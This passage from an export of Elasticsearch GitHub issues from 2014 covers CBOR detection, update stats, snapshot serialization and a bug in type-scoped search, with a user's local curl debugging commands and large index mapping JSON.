</description><key id="42189557">7640</key><summary>CBOR: Improve recognition of CBOR data format</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/pickypg/following{/other_user}', u'events_url': u'https://api.github.com/users/pickypg/events{/privacy}', u'organizations_url': u'https://api.github.com/users/pickypg/orgs', u'url': u'https://api.github.com/users/pickypg', u'gists_url': u'https://api.github.com/users/pickypg/gists{/gist_id}', u'html_url': u'https://github.com/pickypg', u'subscriptions_url': u'https://api.github.com/users/pickypg/subscriptions', u'avatar_url': u'https://avatars2.githubusercontent.com/u/1501235?v=4', u'repos_url': u'https://api.github.com/users/pickypg/repos', u'received_events_url': u'https://api.github.com/users/pickypg/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/pickypg/starred{/owner}{/repo}', u'site_admin': False, u'login': u'pickypg', u'type': u'User', u'id': 1501235, u'followers_url': u'https://api.github.com/users/pickypg/followers'}</assignee><reporter username="">clintongormley</reporter><labels><label>bug</label><label>low hanging fruit</label><label>v2.0.0-beta1</label></labels><created>2014-09-08T12:09:52Z</created><updated>2017-05-30T14:42:14Z</updated><resolved>2015-03-20T21:06:51Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-11-14T11:53:39Z" id="63051536">Jackson 2.4.3 now contains the above fixes.  We should upgrade and add the changes mentioned above.
</comment><comment author="s1monw" created="2014-11-21T09:39:05Z" id="63946442">if we get a fix for this I think it should go into `1.3.6`
</comment><comment author="s1monw" created="2014-11-23T12:55:00Z" id="64116971">do we need to do anything else than upgrading jackson? @pickypg do you have a ETA for this?
</comment><comment author="pickypg" created="2014-11-24T05:48:16Z" id="64154278">I should have this up for review on Monday.

We need to change `XContentFactory.xContentType(...)` to support the new header. By default, the new `CBORGenerator.Feature.WRITE_TYPE_HEADER` feature is `false`, so just upgrading will do nothing (nothing breaks, but nothing improves).
</comment><comment author="pickypg" created="2014-11-25T19:04:53Z" id="64452894">Merged
</comment><comment author="pickypg" created="2014-11-25T21:57:11Z" id="64478230">This was reverted because the JSON tokenizer was acting up in some of the randomized tests. I am looking at the root cause (my change or just incoming changes from 2.4.3).
</comment><comment author="johnrfrank" created="2017-05-30T14:15:35Z" id="304891766">@clintongormley it'd be great to have this feature.  What are the chances this will get into an upcoming release of Elasticsearch?</comment><comment author="nik9000" created="2017-05-30T14:42:14Z" id="304900250">@johnrfrank this was merged into 2.0.0. We've since deprecated content detection in favor of providing a content-type header.</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Update action returns before updating stats for `NONE` operations</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7639</link><project id="" key="" /><description>We keep around a noop stats indicating how many update operations ended up not updating the document (typically because it didn't change). However, the TransportUpdateAction update that counter only after returning the result. This can throw off stats check which are done immediately after, potentially causing test failures.
</description><key id="42181571">7639</key><summary>Update action returns before updating stats for `NONE` operations</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">bleskes</reporter><labels><label>:Stats</label><label>bug</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-08T10:14:03Z</created><updated>2015-06-07T18:48:26Z</updated><resolved>2014-09-08T18:46:53Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="martijnvg" created="2014-09-08T10:59:52Z" id="54803039">LGTM
</comment><comment author="s1monw" created="2014-09-08T13:43:58Z" id="54818790">LGTM
</comment><comment author="nik9000" created="2014-09-08T13:45:20Z" id="54818977">LGTM thanks for catching my mistake!
</comment><comment author="bleskes" created="2014-09-08T18:50:07Z" id="54868469">thx @martijnvg, @s1monw @nik9000 
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Document the Java BulkProcessor</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7638</link><project id="" key="" /><description /><key id="42180981">7638</key><summary>Document the Java BulkProcessor</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/dadoonet/following{/other_user}', u'events_url': u'https://api.github.com/users/dadoonet/events{/privacy}', u'organizations_url': u'https://api.github.com/users/dadoonet/orgs', u'url': u'https://api.github.com/users/dadoonet', u'gists_url': u'https://api.github.com/users/dadoonet/gists{/gist_id}', u'html_url': u'https://github.com/dadoonet', u'subscriptions_url': u'https://api.github.com/users/dadoonet/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/274222?v=4', u'repos_url': u'https://api.github.com/users/dadoonet/repos', u'received_events_url': u'https://api.github.com/users/dadoonet/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/dadoonet/starred{/owner}{/repo}', u'site_admin': False, u'login': u'dadoonet', u'type': u'User', u'id': 274222, u'followers_url': u'https://api.github.com/users/dadoonet/followers'}</assignee><reporter username="">clintongormley</reporter><labels><label>docs</label></labels><created>2014-09-08T10:04:44Z</created><updated>2014-09-22T13:34:30Z</updated><resolved>2014-09-22T13:34:30Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>Write Snapshots directly to the blobstore stream</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7637</link><project id="" key="" /><description>Today we serialize the snashot metadata to a byte array and then copy
the byte array to a stream. Instead this commit moves the serialization
directly to the target stream without the intermediate representation.
</description><key id="42179324">7637</key><summary>Write Snapshots directly to the blobstore stream</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">s1monw</reporter><labels><label>:Snapshot/Restore</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-08T09:40:53Z</created><updated>2015-06-07T12:04:21Z</updated><resolved>2014-09-08T20:30:38Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="imotov" created="2014-09-08T20:07:45Z" id="54879021">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>In thread pools, use DirectExecutor instead of deprecated API</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7636</link><project id="" key="" /><description>Guava deprecated MoreExecutors#sameThreadExecutor in favour of
a more efficient implementation. We should move over to the new impl.
</description><key id="42179111">7636</key><summary>In thread pools, use DirectExecutor instead of deprecated API</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">s1monw</reporter><labels><label>:Internal</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-08T09:37:41Z</created><updated>2015-06-07T12:04:32Z</updated><resolved>2014-09-10T07:42:58Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="spinscale" created="2014-09-09T07:34:53Z" id="54934559">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>search by type in URL finds a document of a different type</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7635</link><project id="" key="" /><description>When searching for a object of type 'stc_formula' on a single index stored in a single shard ES-1.3.0 is finding a document of type 'stc_field':

```
$ curl -XGET "http://localhost:9200"
{
  "status" : 200,
  "name" : "Prowler",
  "version" : {
    "number" : "1.3.0",
    "build_hash" : "1265b1454eee7725a6918f57415c480028700fb4",
    "build_timestamp" : "2014-07-23T13:46:36Z",
    "build_snapshot" : false,
    "lucene_version" : "4.9"
  },
  "tagline" : "You Know, for Search"
}

$ curl -XPOST 'http://localhost:9200/u-localhost-tmp-75994729-9054-40ec-9bdd-414366739e51-v20140903133358/_cache/clear'
{"_shards":{"total":1,"successful":1,"failed":0}}~

# Edit.... thanks Clinton!
#$ curl -XPOST 'http://localhost:9200/u-localhost-tmp-75994729-9054-40ec-9bdd-414366739e51-v20140903133358/_cache/clear'
# The actual search URL:
$ curl -XPOST "http://localhost:9200/u-localhost-tmp-75994729-9054-40ec-9bdd-414366739e51-v20140903133358/stc_formula/_search?pretty=true" -d '
{
 "query": { "match_all": {} },
 "explain": true,
 "_source": false
}
'

{
  "took" : 72,
  "timed_out" : false,
  "_shards" : {
    "total" : 1,
    "successful" : 1,
    "failed" : 0
  },
  "hits" : {
    "total" : 1,
    "max_score" : 1.0,
    "hits" : [ {
      "_shard" : 0,
      "_node" : "Rno76WbaR5S16cN9mAf7ww",
      "_index" : "u-localhost-tmp-75994729-9054-40ec-9bdd-414366739e51-v20140903133358",
      "_type" : "stc_field",
      "_id" : "ba706935-1d7f-42b9-9b02-c0c5b5897bf4",
      "_score" : 1.0,
      "_explanation" : {
        "value" : 1.0,
        "description" : "ConstantScore(cache(stc_formula:)), product of:",
        "details" : [ {
          "value" : 1.0,
          "description" : "boost"
        }, {
          "value" : 1.0,
          "description" : "queryNorm"
        } ]
      }
    } ]
  }
}
```

If I use a type filter in the search body, either as filtered query or as a top-level filter then the results are empty as expected.

Thanks for your help!
</description><key id="42162411">7635</key><summary>search by type in URL finds a document of a different type</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/jpountz/following{/other_user}', u'events_url': u'https://api.github.com/users/jpountz/events{/privacy}', u'organizations_url': u'https://api.github.com/users/jpountz/orgs', u'url': u'https://api.github.com/users/jpountz', u'gists_url': u'https://api.github.com/users/jpountz/gists{/gist_id}', u'html_url': u'https://github.com/jpountz', u'subscriptions_url': u'https://api.github.com/users/jpountz/subscriptions', u'avatar_url': u'https://avatars2.githubusercontent.com/u/299848?v=4', u'repos_url': u'https://api.github.com/users/jpountz/repos', u'received_events_url': u'https://api.github.com/users/jpountz/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/jpountz/starred{/owner}{/repo}', u'site_admin': False, u'login': u'jpountz', u'type': u'User', u'id': 299848, u'followers_url': u'https://api.github.com/users/jpountz/followers'}</assignee><reporter username="">hmalphettes</reporter><labels><label>bug</label></labels><created>2014-09-08T03:49:12Z</created><updated>2015-11-21T18:35:50Z</updated><resolved>2015-11-21T18:35:49Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-08T07:10:37Z" id="54783397">Hi @hmalphettes 

You have shown us everything except the actual search URL...
</comment><comment author="hmalphettes" created="2014-09-08T07:25:34Z" id="54784347">@clintongormley thanks for looking at it so quickly.

I edited the original description with the actual search URL. Sorry for the mishap.

Here is a filtered query that returns the expected empty result:

```
curl -XPOST "http://localhost:9200/u-localhost-tmp-75994729-9054-40ec-9bdd-414366739e51-v20140903133358/_search?pretty=true" -d '
{
  "query": {
    "filtered": {
      "query": { "match_all": {} },
      "filter": { "type": { "value": "stc_formula" } }
    }
  },
  "_source": false
}
'
```

Thanks for your attention.
</comment><comment author="clintongormley" created="2014-09-08T09:06:43Z" id="54792697">Hi @hmalphettes 

This is very weird.  Looking at the `explain` output, it says:

```
"ConstantScore(cache(stc_formula:)), product of:"
```

In other words, `stc_formula` is being treated as a field name, rather than as a term in the `_type` field.  If I run your request (with the type in the URL) locally on 1.3.0, I get:

```
ConstantScore(cache(_type:stc_formula))
```

Please could you run exactly the below request and paste the output:

```
curl -XPOST "http://localhost:9200/u-localhost-tmp-75994729-9054-40ec-9bdd-414366739e51-v20140903133358/stc_formula/_search?explain" -d'
{
  "query": {
    "match_all": {}
  },
  "explain": true,
  "_source": false
}'
```
</comment><comment author="clintongormley" created="2014-09-08T09:08:42Z" id="54792871">Also, the output of:

```
curl "http://localhost:9200/u-localhost-tmp-75994729-9054-40ec-9bdd-414366739e51-v20140903133358/_mapping
curl "http://localhost:9200/u-localhost-tmp-75994729-9054-40ec-9bdd-414366739e51-v20140903133358/_settings
```
</comment><comment author="hmalphettes" created="2014-09-08T10:26:44Z" id="54800215">```
curl -XPOST "http://localhost:9200/u-localhost-tmp-75994729-9054-40ec-9bdd-414366739e51-v20140903133358/stc_formula/_search?explain" -d'
quote&gt; {
quote&gt;   "query": {
quote&gt;     "match_all": {}
quote&gt;   },
quote&gt;   "explain": true,
quote&gt;   "_source": false
quote&gt; }'
{"took":1,"timed_out":false,"_shards":{"total":1,"successful":1,"failed":0},"hits":{"total":1,"max_score":1.0,"hits":[{"_shard":0,"_node":"Rno76WbaR5S16cN9mAf7ww","_index":"u-localhost-tmp-75994729-9054-40ec-9bdd-414366739e51-v20140903133358","_type":"stc_field","_id":"ba706935-1d7f-42b9-9b02-c0c5b5897bf4","_score":1.0,"_explanation":{"value":1.0,"description":"ConstantScore(cache(stc_formula:)), product of:","details":[{"value":1.0,"description":"boost"},{"value":1.0,"description":"queryNorm"}]}}]}}%
```

Here are the settings and then the mappings
Scary big and there might be some fields that are used by multiple objects but with inconsistent datatypes.
I apologize for the size.

```
{
  "u-localhost-tmp-75994729-9054-40ec-9bdd-414366739e51-v20140903133358" : {
    "settings" : {
      "index" : {
        "cache" : {
          "filter" : {
            "terms" : {
              "expire_after_access" : "5m"
            }
          }
        },
        "number_of_shards" : "1",
        "mapper" : {
          "dynamic" : "false"
        },
        "analysis" : {
          "filter" : {
            "truncate_512" : {
              "type" : "truncate",
              "length" : "512"
            },
            "truncate_96" : {
              "type" : "truncate",
              "length" : "96"
            },
            "max_length_1024" : {
              "type" : "length",
              "max" : "1024",
              "min" : "0"
            },
            "nGram_filter" : {
              "token_chars" : [ "letter", "digit", "symbol" ],
              "min_gram" : "1",
              "type" : "nGram",
              "max_gram" : "12"
            }
          },
          "analyzer" : {
            "str_lwc" : {
              "filter" : [ "truncate_96", "lowercase" ],
              "tokenizer" : "keyword"
            },
            "not_analyzed_truncated" : {
              "filter" : [ "truncate_512" ],
              "tokenizer" : "keyword"
            },
            "nGram_analyzer" : {
              "filter" : [ "lowercase", "asciifolding", "nGram_filter" ],
              "type" : "custom",
              "tokenizer" : "whitespace"
            },
            "whitespace_analyzer" : {
              "filter" : [ "lowercase", "asciifolding" ],
              "type" : "custom",
              "tokenizer" : "whitespace"
            },
            "uax_url_email" : {
              "filter" : [ "standard", "lowercase" ],
              "tokenizer" : "uax_url_email"
            },
            "not_analyzed_not_immense" : {
              "filter" : [ "max_length_1024" ],
              "tokenizer" : "keyword"
            }
          }
        },
        "uuid" : "WK4EwKCHQHC-PIf13ZBMsA",
        "version" : {
          "created" : "1030099"
        },
        "number_of_replicas" : "0"
      }
    }
  }
}

```

Mappings:

```
{
  "u-localhost-tmp-75994729-9054-40ec-9bdd-414366739e51-v20140903133358" : {
    "mappings" : {
      "stc_workflow" : {
        "properties" : {
          "_base" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "_deleted" : {
            "type" : "boolean",
            "doc_values_format" : "disk"
          },
          "id" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_access" : {
            "type" : "string",
            "analyzer" : "not_analyzed_truncated",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_access-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              },
              "stc_access-a" : {
                "type" : "string"
              }
            }
          },
          "stc_assigned_to" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_comments" : {
            "properties" : {
              "target_object" : {
                "type" : "string",
                "index" : "not_analyzed",
                "doc_values_format" : "disk"
              },
              "target_record" : {
                "type" : "string",
                "index" : "not_analyzed",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_connection" : {
            "type" : "string",
            "analyzer" : "not_analyzed_truncated",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_connection-a" : {
                "type" : "string"
              },
              "stc_connection-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_context" : {
            "type" : "string",
            "analyzer" : "not_analyzed_truncated",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_context-a" : {
                "type" : "string"
              },
              "stc_context-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_copyright" : {
            "type" : "string",
            "analyzer" : "not_analyzed_truncated",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_copyright-a" : {
                "type" : "string"
              },
              "stc_copyright-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_created_by" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_created_on" : {
            "type" : "date",
            "format" : "dateOptionalTime"
          },
          "stc_custodian" : {
            "type" : "string",
            "index" : "not_analyzed"
          },
          "stc_datasource" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_description" : {
            "type" : "string",
            "analyzer" : "not_analyzed_not_immense",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_description-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              },
              "stc_description-a" : {
                "type" : "string"
              }
            }
          },
          "stc_due_on" : {
            "type" : "date",
            "format" : "dateOptionalTime"
          },
          "stc_fid" : {
            "type" : "string",
            "analyzer" : "not_analyzed_not_immense",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_fid-a" : {
                "type" : "string"
              },
              "stc_fid-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_files" : {
            "properties" : {
              "target_object" : {
                "type" : "string",
                "index" : "not_analyzed",
                "doc_values_format" : "disk"
              },
              "target_record" : {
                "type" : "string",
                "index" : "not_analyzed",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_name" : {
            "type" : "string",
            "analyzer" : "not_analyzed_not_immense",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_name-ng" : {
                "type" : "string",
                "index_analyzer" : "nGram_analyzer",
                "search_analyzer" : "whitespace_analyzer"
              },
              "stc_name-a" : {
                "type" : "string"
              },
              "stc_name-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_notes" : {
            "type" : "string",
            "analyzer" : "not_analyzed_not_immense",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_notes-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              },
              "stc_notes-a" : {
                "type" : "string"
              }
            }
          },
          "stc_owner" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_properties" : {
            "type" : "object",
            "dynamic" : "true"
          },
          "stc_protected" : {
            "type" : "boolean"
          },
          "stc_related_items" : {
            "properties" : {
              "target_object" : {
                "type" : "string",
                "index" : "not_analyzed",
                "doc_values_format" : "disk"
              },
              "target_record" : {
                "type" : "string",
                "index" : "not_analyzed",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_steps" : {
            "type" : "string",
            "analyzer" : "not_analyzed_truncated",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_steps-a" : {
                "type" : "string"
              },
              "stc_steps-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_tags" : {
            "type" : "string",
            "analyzer" : "not_analyzed_truncated",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_tags-a" : {
                "type" : "string"
              },
              "stc_tags-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_token" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_transitioned_by" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_transitioned_on" : {
            "type" : "date",
            "format" : "dateOptionalTime"
          },
          "stc_transitions" : {
            "type" : "string",
            "analyzer" : "not_analyzed_truncated",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_transitions-a" : {
                "type" : "string"
              },
              "stc_transitions-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_updated_by" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_updated_on" : {
            "type" : "date",
            "format" : "dateOptionalTime"
          },
          "stc_workflow" : {
            "type" : "string",
            "index" : "not_analyzed"
          }
        }
      },
      "insertError" : {
        "include_in_all" : false,
        "properties" : {
          "error" : {
            "type" : "string",
            "index" : "not_analyzed",
            "include_in_all" : false
          },
          "id" : {
            "type" : "string",
            "index" : "not_analyzed",
            "include_in_all" : false
          }
        }
      },
      "stc_field" : {
        "_meta" : {
          "fields" : {
            "id" : {
              "type" : "UUID",
              "key" : true
            },
            "stc_name" : {
              "type" : "String",
              "stc_family" : "textual"
            },
            "stc_workflow" : {
              "type" : "String"
            },
            "stc_identifier" : {
              "type" : "String"
            },
            "stc_custodian" : {
              "type" : "String"
            },
            "stc_default_value" : {
              "type" : "String",
              "stc_family" : "textual"
            },
            "stc_formula" : {
              "type" : "String",
              "stc_family" : "textual"
            },
            "stc_required" : {
              "type" : "Boolean"
            },
            "stc_important" : {
              "type" : "Boolean"
            },
            "stc_informative" : {
              "type" : "Boolean"
            },
            "stc_hidden" : {
              "type" : "Boolean"
            },
            "stc_overridable" : {
              "type" : "Boolean"
            },
            "stc_uneditable" : {
              "type" : "Boolean"
            },
            "stc_immutable" : {
              "type" : "Boolean"
            },
            "stc_protected" : {
              "type" : "Boolean"
            },
            "stc_benchmarked" : {
              "type" : "Boolean"
            },
            "stc_cached" : {
              "type" : "Boolean"
            },
            "stc_commit" : {
              "type" : "Boolean"
            },
            "stc_better" : {
              "type" : "String"
            },
            "stc_validation" : {
              "type" : "String",
              "stc_family" : "textual"
            },
            "stc_container" : {
              "type" : "String"
            },
            "stc_label" : {
              "type" : "String",
              "stc_family" : "textual"
            },
            "stc_position" : {
              "type" : "Float"
            },
            "stc_step" : {
              "type" : "String"
            },
            "stc_placeholder" : {
              "type" : "String",
              "stc_family" : "textual"
            },
            "stc_question" : {
              "type" : "String",
              "stc_family" : "textual"
            },
            "stc_description" : {
              "type" : "String",
              "stc_family" : "textual"
            },
            "stc_sample" : {
              "type" : "String",
              "stc_family" : "textual"
            },
            "stc_documentation" : {
              "type" : "String",
              "stc_family" : "textual"
            },
            "stc_definition" : {
              "type" : "JSON"
            },
            "stc_options" : {
              "type" : "JSON"
            },
            "stc_mappings" : {
              "type" : "JSON"
            },
            "stc_connectivity" : {
              "type" : "JSON"
            },
            "stc_properties" : {
              "type" : "JSON",
              "datatype" : "stc_attributes"
            },
            "stc_notes" : {
              "type" : "String",
              "stc_family" : "textual"
            },
            "stc_comments" : {
              "type" : "JSON",
              "datatype" : "stc_advanced"
            },
            "stc_files" : {
              "type" : "JSON",
              "datatype" : "stc_advanced"
            },
            "stc_related_items" : {
              "type" : "JSON",
              "datatype" : "stc_advanced"
            },
            "stc_tags" : {
              "type" : "JSON"
            },
            "stc_token" : {
              "type" : "UUID"
            },
            "stc_transitions" : {
              "type" : "JSON"
            },
            "stc_due_on" : {
              "type" : "Timestamp"
            },
            "stc_access" : {
              "type" : "JSON"
            },
            "stc_created_on" : {
              "type" : "Timestamp"
            },
            "stc_transitioned_on" : {
              "type" : "Timestamp"
            },
            "stc_updated_on" : {
              "type" : "Timestamp"
            },
            "stc_fid" : {
              "type" : "String",
              "stc_family" : "textual"
            },
            "stc_connection" : {
              "type" : "JSON"
            },
            "stc_context" : {
              "type" : "JSON"
            },
            "stc_copyright" : {
              "type" : "JSON"
            }
          },
          "has1Relations" : {
            "stc_application" : {
              "fieldName" : "stc_application",
              "relatedTableName" : "stc_application"
            },
            "stc_object" : {
              "fieldName" : "stc_object",
              "relatedTableName" : "stc_object"
            },
            "stc_datatype" : {
              "fieldName" : "stc_datatype",
              "relatedTableName" : "stc_datatype"
            },
            "stc_variation" : {
              "fieldName" : "stc_variation",
              "relatedTableName" : "stc_field"
            },
            "stc_control" : {
              "fieldName" : "stc_control",
              "relatedTableName" : "stc_control"
            },
            "stc_assigned_to" : {
              "fieldName" : "stc_assigned_to",
              "relatedTableName" : "stc_user"
            },
            "stc_owner" : {
              "fieldName" : "stc_owner",
              "relatedTableName" : "stc_user"
            },
            "stc_created_by" : {
              "fieldName" : "stc_created_by",
              "relatedTableName" : "stc_user"
            },
            "stc_transitioned_by" : {
              "fieldName" : "stc_transitioned_by",
              "relatedTableName" : "stc_user"
            },
            "stc_updated_by" : {
              "fieldName" : "stc_updated_by",
              "relatedTableName" : "stc_user"
            },
            "stc_datasource" : {
              "fieldName" : "stc_datasource",
              "relatedTableName" : "stc_datasource"
            }
          },
          "datasource" : "d63fded1-043c-43ad-9135-d96b6d16cced",
          "signature" : 770848076,
          "timestamp" : 1409751256391
        },
        "properties" : {
          "_base" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "_deleted" : {
            "type" : "boolean",
            "doc_values_format" : "disk"
          },
          "id" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_access" : {
            "type" : "string",
            "analyzer" : "not_analyzed_truncated",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_access-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              },
              "stc_access-a" : {
                "type" : "string"
              }
            }
          },
          "stc_application" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_assigned_to" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_benchmarked" : {
            "type" : "boolean"
          },
          "stc_better" : {
            "type" : "string",
            "index" : "not_analyzed"
          },
          "stc_cached" : {
            "type" : "boolean"
          },
          "stc_comments" : {
            "properties" : {
              "target_object" : {
                "type" : "string",
                "index" : "not_analyzed",
                "doc_values_format" : "disk"
              },
              "target_record" : {
                "type" : "string",
                "index" : "not_analyzed",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_commit" : {
            "type" : "boolean"
          },
          "stc_connection" : {
            "type" : "string",
            "analyzer" : "not_analyzed_truncated",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_connection-a" : {
                "type" : "string"
              },
              "stc_connection-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_connectivity" : {
            "type" : "string",
            "analyzer" : "not_analyzed_truncated",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_connectivity-a" : {
                "type" : "string"
              },
              "stc_connectivity-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_container" : {
            "type" : "string",
            "index" : "not_analyzed"
          },
          "stc_context" : {
            "type" : "string",
            "analyzer" : "not_analyzed_truncated",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_context-a" : {
                "type" : "string"
              },
              "stc_context-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_control" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_copyright" : {
            "type" : "string",
            "analyzer" : "not_analyzed_truncated",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_copyright-a" : {
                "type" : "string"
              },
              "stc_copyright-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_created_by" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_created_on" : {
            "type" : "date",
            "format" : "dateOptionalTime"
          },
          "stc_custodian" : {
            "type" : "string",
            "index" : "not_analyzed"
          },
          "stc_datasource" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_datatype" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_default_value" : {
            "type" : "string",
            "analyzer" : "not_analyzed_not_immense",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_default_value-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              },
              "stc_default_value-a" : {
                "type" : "string"
              }
            }
          },
          "stc_definition" : {
            "type" : "string",
            "analyzer" : "not_analyzed_truncated",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_definition-a" : {
                "type" : "string"
              },
              "stc_definition-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_description" : {
            "type" : "string",
            "analyzer" : "not_analyzed_not_immense",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_description-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              },
              "stc_description-a" : {
                "type" : "string"
              }
            }
          },
          "stc_documentation" : {
            "type" : "string",
            "analyzer" : "not_analyzed_not_immense",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_documentation-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              },
              "stc_documentation-a" : {
                "type" : "string"
              }
            }
          },
          "stc_due_on" : {
            "type" : "date",
            "format" : "dateOptionalTime"
          },
          "stc_fid" : {
            "type" : "string",
